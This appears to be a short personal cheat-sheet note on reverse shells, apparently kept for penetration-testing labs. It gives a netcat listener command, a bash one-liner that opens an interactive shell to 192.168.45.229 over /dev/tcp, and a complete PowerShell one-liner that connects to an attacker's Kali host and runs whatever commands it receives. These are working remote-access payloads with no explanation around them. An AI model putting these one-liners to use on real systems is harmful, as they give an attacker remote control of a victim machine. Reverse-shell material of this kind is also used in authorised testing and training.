

sudo rlwrap -cAr nc -lvnp 443

/bin/bash -i >& /dev/tcp/192.168.45.229/443 0>&1

![[revshells.png|500]]


powershell oneliner

```
powershell -c "$client = New-Object System.Net.Sockets.TCPClient('< KALI-IP >',4444);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendword = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendword);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()"
```